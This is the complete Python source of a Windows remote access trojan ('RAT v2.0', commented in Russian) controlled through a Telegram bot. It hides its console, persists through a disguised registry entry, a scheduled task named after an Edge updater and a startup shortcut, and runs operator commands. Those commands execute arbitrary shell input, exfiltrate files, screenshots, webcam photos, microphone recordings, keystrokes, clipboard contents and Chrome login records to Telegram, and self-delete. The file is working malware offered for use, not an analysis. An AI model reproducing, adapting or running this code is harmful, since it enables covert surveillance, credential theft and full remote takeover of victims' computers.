import os
import sys
import subprocess
import threading
import time
import requests
import json
import ctypes
import winreg
import shutil
import getpass
import base64
import io
from datetime import datetime
import socket
import platform
import psutil
import cv2
import pyaudio
import wave
import pyautogui
from PIL import Image
import keyboard
import sqlite3
import hashlib
import random
import string

# --- Конфигурация Telegram ---
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
CHAT_ID = "ВАШ_ID_ЧАТА"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

# --- Скрытие консоли ---
if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# --- Глобальные переменные ---
keylog_active = False
keylog_data = []
audio_session_active = False

# --- Функции для автозагрузки (неубиваемой)---
def add_to_startup():
    try:
        appdata = os.environ.get('APPDATA')
        dest = os.path.join(appdata, 'WindowsSecurityHelper.exe')
        if not os.path.exists(dest):
            shutil.copy2(sys.executable if getattr(sys, 'frozen', False) else __file__, dest)
        
        # Реестр
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSecurityHelper", 0, winreg.REG_SZ, dest)
        winreg.CloseKey(key)
        
        # Планировщик
        task_command = f'schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "{dest}" /sc onlogon /f /rl highest'
        subprocess.run(task_command, shell=True, capture_output=True)
        
        # Папка автозагрузки
        startup_folder = os.path.join(os.environ['PROGRAMDATA'], 
                                       'Microsoft\\Windows\\Start Menu\\Programs\\StartUp')
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        shortcut_path = os.path.join(startup_folder, 'SystemHelper.lnk')
        if not os.path.exists(shortcut_path):
            vbs_code = f'''
            Set oWS = WScript.CreateObject("WScript.Shell")
            sLinkFile = "{shortcut_path}"
            Set oLink = oWS.CreateShortcut(sLinkFile)
            oLink.TargetPath = "{dest}"
            oLink.Save
            '''
            with open('create_shortcut.vbs', 'w') as f:
                f.write(vbs_code)
            subprocess.run('cscript create_shortcut.vbs', shell=True)
            os.remove('create_shortcut.vbs')
            
    except Exception:
        pass

# --- Защита процесса ---
def keep_alive():
    while True:
        time.sleep(30)
        appdata = os.environ.get('APPDATA')
        dest = os.path.join(appdata, 'WindowsSecurityHelper.exe')
        if not os.path.exists(dest):
            add_to_startup()
            if getattr(sys, 'frozen', False):
                subprocess.Popen([dest], shell=True)
        result = subprocess.run('schtasks /query /tn "MicrosoftEdgeUpdateTask"', 
                               shell=True, capture_output=True)
        if "MicrosoftEdgeUpdateTask" not in result.stdout.decode():
            task_command = f'schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "{dest}" /sc onlogon /f /rl highest'
            subprocess.run(task_command, shell=True)

# --- Функции Telegram ---
def send_message(text, chat_id=None):
    try:
        url = API_URL + "sendMessage"
        payload = {"chat_id": chat_id or CHAT_ID, "text": text[:4096]}
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def send_photo(photo_path, caption=""):
    try:
        url = API_URL + "sendPhoto"
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': CHAT_ID, 'caption': caption[:1024]}
            requests.post(url, files=files, data=data, timeout=10)
    except:
        pass

def send_file(file_path, caption=""):
    try:
        url = API_URL + "sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID, 'caption': caption[:1024]}
            requests.post(url, files=files, data=data, timeout=15)
    except:
        pass

def send_audio(audio_path):
    try:
        url = API_URL + "sendAudio"
        with open(audio_path, 'rb') as f:
            files = {'audio': f}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data, timeout=15)
    except:
        pass

def get_updates(offset=None):
    try:
        url = API_URL + "getUpdates"
        params = {"timeout": 30, "offset": offset}
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except:
        return []

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        output = result.stdout + result.stderr
        if not output.strip():
            output = "[✓] Команда выполнена успешно"
        return output[:4000]
    except subprocess.TimeoutExpired:
        return "[!] Команда выполнялась слишком долго и была прервана"
    except Exception as e:
        return str(e)

# --- Управление файлами ---
def list_directory(path):
    try:
        items = os.listdir(path)
        result = f"📁 {path}\n\n"
        for item in items[:50]:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                result += f"📁 {item}\n"
            else:
                size = os.path.getsize(full_path)
                result += f"📄 {item} ({size} bytes)\n"
        return result
    except Exception as e:
        return f"Ошибка: {e}"

def upload_file(file_path):
    try:
        if os.path.exists(file_path) and os.path.getsize(file_path) < 50 * 1024 * 1024:
            send_file(file_path, f"📎 {os.path.basename(file_path)}")
            return f"Файл {file_path} отправлен"
        return "Файл не найден или слишком большой"
    except Exception as e:
        return f"Ошибка: {e}"

def download_file(url, save_path):
    try:
        r = requests.get(url, timeout=30)
        with open(save_path, 'wb') as f:
            f.write(r.content)
        return f"Файл загружен: {save_path}"
    except Exception as e:
        return f"Ошибка: {e}"

# --- Скриншоты и веб-камера ---
def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        temp_path = os.path.join(os.environ['TEMP'], f'screenshot_{int(time.time())}.png')
        screenshot.save(temp_path)
        send_photo(temp_path, "📸 Скриншот экрана")
        os.remove(temp_path)
        return "Скриншот отправлен"
    except Exception as e:
        return f"Ошибка: {e}"

def webcam_capture():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            temp_path = os.path.join(os.environ['TEMP'], f'webcam_{int(time.time())}.jpg')
            cv2.imwrite(temp_path, frame)
            send_photo(temp_path, "📷 Фото с веб-камеры")
            os.remove(temp_path)
        cap.release()
        return "Фото отправлено" if ret else "Не удалось захватить кадр"
    except Exception as e:
        return f"Ошибка: {e}"

def record_microphone(duration=5):
    try:
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        RECORD_SECONDS = duration
        
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                           rate=RATE, input=True,
                           frames_per_buffer=CHUNK)
        
        frames = []
        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        temp_path = os.path.join(os.environ['TEMP'], f'audio_{int(time.time())}.wav')
        wf = wave.open(temp_path, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        send_audio(temp_path)
        os.remove(temp_path)
        return f"Аудио записано ({duration} сек)"
    except Exception as e:
        return f"Ошибка: {e}"

# --- Кейлоггер ---
def keylogger_callback(event):
    global keylog_data
    keylog_data.append(event.name)

def start_keylogger():
    global keylog_active
    if not keylog_active:
        keylog_active = True
        keyboard.on_release(keylogger_callback)
        return "Кейлоггер запущен"
    return "Кейлоггер уже запущен"

def stop_keylogger():
    global keylog_active, keylog_data
    if keylog_active:
        keyboard.unhook_all()
        keylog_active = False
        data = ''.join(keylog_data)
        if data:
            temp_path = os.path.join(os.environ['TEMP'], f'keylog_{int(time.time())}.txt')
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(data)
            send_file(temp_path, "📝 Лог клавиатуры")
            os.remove(temp_path)
        keylog_data = []
        return "Кейлоггер остановлен, лог отправлен"
    return "Кейлоггер не активен"

# --- Системная информация ---
def get_system_info():
    info = f"""
🖥️ СИСТЕМНАЯ ИНФОРМАЦИЯ
━━━━━━━━━━━━━━━━━━━━
💻 Пользователь: {getpass.getuser()}
🖥️ Компьютер: {platform.node()}
🐍 OS: {platform.system()} {platform.release()}
🏛️ Архитектура: {platform.machine()}
🌐 IP: {execute_command('curl -s ifconfig.me')}
📊 CPU: {psutil.cpu_percent()}%
💾 RAM: {psutil.virtual_memory().percent}%
💿 Диск C: {psutil.disk_usage('C:').percent}%
🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    return info

# --- Управление процессами ---
def list_processes():
    procs = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
        try:
            procs.append(f"{proc.info['pid']:6} {proc.info['name'][:30]:30} CPU:{proc.info['cpu_percent']:5}% MEM:{proc.info['memory_percent']:5}%")
        except:
            pass
    return "PID   NAME                           CPU    MEM\n" + "\n".join(procs[:50])

def kill_process(pid):
    try:
        proc = psutil.Process(pid)
        proc.terminate()
        return f"Процесс {pid} завершен"
    except Exception as e:
        return f"Ошибка: {e}"

# --- Управление системой ---
def lock_screen():
    ctypes.windll.user32.LockWorkStation()
    return "Экран заблокирован"

def shutdown():
    os.system("shutdown /s /t 10")
    return "Выключение через 10 секунд"

def restart():
    os.system("shutdown /r /t 10")
    return "Перезагрузка через 10 секунд"

def abort_shutdown():
    os.system("shutdown /a")
    return "Выключение отменено"

# --- Сбор паролей (браузеры) ---
def steal_chrome_passwords():
    try:
        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        if not os.path.exists(chrome_path):
            return "Chrome не найден"
        
        temp_path = os.path.join(os.environ['TEMP'], 'chrome_login_temp.db')
        shutil.copy2(chrome_path, temp_path)
        
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted = row[2]
            # Для полного дешифрования нужен Windows CryptUnprotectData
            passwords.append(f"URL: {url}\nUser: {username}\nPass: [зашифровано]\n")
        
        conn.close()
        os.remove(temp_path)
        
        if passwords:
            result = "\n".join(passwords[:20])
            return result
        return "Паролей не найдено"
    except Exception as e:
        return f"Ошибка: {e}"

# --- Персистентность и самоудаление ---
def self_destruct():
    try:
        # Удаляем все автозагрузки
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 
                             0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsSecurityHelper")
        winreg.CloseKey(key)
        
        subprocess.run('schtasks /delete /tn "MicrosoftEdgeUpdateTask" /f', shell=True)
        
        # Самоудаление
        batch = f"""
        @echo off
        timeout /t 2 /nobreak > nul
        del "{sys.executable}"
        del "%~f0"
        """
        batch_path = os.path.join(os.environ['TEMP'], 'selfdestruct.bat')
        with open(batch_path, 'w') as f:
            f.write(batch)
        subprocess.Popen(batch_path, shell=True)
        sys.exit(0)
    except:
        pass

# --- Основной обработчик ---
def handle_command(text):
    global audio_session_active
    
    if text.startswith("/cmd "):
        return execute_command(text[5:])
    elif text == "/info":
        return get_system_info()
    elif text.startswith("/cd "):
        try:
            os.chdir(text[4:])
            return f"Перешли в: {os.getcwd()}"
        except Exception as e:
            return f"Ошибка: {e}"
    elif text == "/pwd":
        return os.getcwd()
    elif text.startswith("/ls "):
        return list_directory(text[4:])
    elif text == "/ls":
        return list_directory(os.getcwd())
    elif text.startswith("/upload "):
        return upload_file(text[8:])
    elif text.startswith("/download "):
        parts = text[10:].split(" ", 1)
        if len(parts) == 2:
            return download_file(parts[0], parts[1])
        return "Использование: /download <url> <путь_сохранения>"
    elif text == "/screenshot":
        return take_screenshot()
    elif text == "/webcam":
        return webcam_capture()
    elif text.startswith("/mic "):
        try:
            duration = int(text[5:])
            return record_microphone(duration)
        except:
            return record_microphone(5)
    elif text == "/mic":
        return record_microphone(5)
    elif text == "/keylog_start":
        return start_keylogger()
    elif text == "/keylog_stop":
        return stop_keylogger()
    elif text == "/processes":
        return list_processes()
    elif text.startswith("/kill "):
        return kill_process(int(text[6:]))
    elif text == "/lock":
        return lock_screen()
    elif text == "/shutdown":
        return shutdown()
    elif text == "/restart":
        return restart()
    elif text == "/abort":
        return abort_shutdown()
    elif text == "/chrome_pass":
        return steal_chrome_passwords()
    elif text == "/clipboard":
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return f"📋 Буфер обмена: {data}"
        except:
            return "Не удалось получить данные буфера"
    elif text.startswith("/msgbox "):
        try:
            msg = text[8:]
            ctypes.windll.user32.MessageBoxW(0, msg, "Системное сообщение", 0)
            return "Сообщение отправлено"
        except:
            return "Ошибка"
    elif text == "/die":
        send_message("💀 Завершение работы...")
        sys.exit(0)
    elif text == "/selfdestruct":
        send_message("💣 Самоуничтожение...")
        self_destruct()
    else:
        return "Доступные команды:\n" \
               "/cmd <команда> - выполнить любую команду\n" \
               "/info - инфо о системе\n" \
               "/cd <путь> - сменить директорию\n" \
               "/pwd - текущая директория\n" \
               "/ls [путь] - список файлов\n" \
               "/upload <путь> - скачать файл с ПК\n" \
               "/download <url> <путь> - загрузить файл на ПК\n" \
               "/screenshot - скриншот\n" \
               "/webcam - фото с камеры\n" \
               "/mic [сек] - запись микрофона\n" \
               "/keylog_start - запустить кейлоггер\n" \
               "/keylog_stop - остановить кейлоггер\n" \
               "/processes - список процессов\n" \
               "/kill <pid> - убить процесс\n" \
               "/lock - блокировка экрана\n" \
               "/shutdown - выключить ПК\n" \
               "/restart - перезагрузить ПК\n" \
               "/abort - отменить выключение\n" \
               "/chrome_pass - пароли Chrome\n" \
               "/clipboard - буфер обмена\n" \
               "/msgbox <текст> - показать сообщение\n" \
               "/die - остановить клиент\n" \
               "/selfdestruct - самоуничтожение"

def main_loop():
    send_message(f"[✅] RAT v2.0 активирован\n💻 {getpass.getuser()}@{platform.node()}")
    offset = None
    while True:
        try:
            updates = get_updates(offset)
            for update in updates:
                offset = update["update_id"] + 1
                if "message" in update and "text" in update["message"]:
                    text = update["message"]["text"]
                    response = handle_command(text)
                    if response:
                        send_message(response)
            time.sleep(1)
        except Exception as e:
            time.sleep(5)

# --- Запуск ---
if __name__ == "__main__":
    add_to_startup()
    threading.Thread(target=keep_alive, daemon=True).start()
    main_loop()